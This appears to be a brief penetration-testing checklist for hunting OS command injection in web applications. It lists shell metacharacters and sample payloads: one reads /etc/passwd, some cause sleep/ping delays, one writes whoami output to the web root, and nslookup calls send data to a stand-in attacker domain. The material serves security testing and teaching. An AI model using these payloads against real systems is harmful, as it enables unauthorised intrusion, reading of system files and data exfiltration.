Hunting for Command injection:

1- Map the application
2- identify all instances where the web application appears to be interacting with the underlying operating system.

-->>> shell metacharacters : &,&&,|,||,;,\n,`,$() 

3- For in-band comman injection , analyze the response of the application to determine if it's vulnerable .
- Concatenate another command 
->> 127.0.0.1 && cat /etc/passwd

4- For blind command injection 
- Trigger a time delay using the ping or sleep command .
->> 127.0.0.1 && sleep  10 &	  "Unix"
->> 127.0.0.1 && ping -c 10 127.0.0.1 &	  "Unix and Windows"
- Output the response of the command in the web root and retrive the file directly using browser
->> 127.0.0.1 & whoami > /var/www/static/whoami.txt &
- Open an out-of-band channel back to a server you cantrol
->> 127.0.0.1 & nslookup idnwieun.web-attacker.com &
->> 127.0.0.1 & nslookup `whoami`.idnwieun.web-attacker.com &
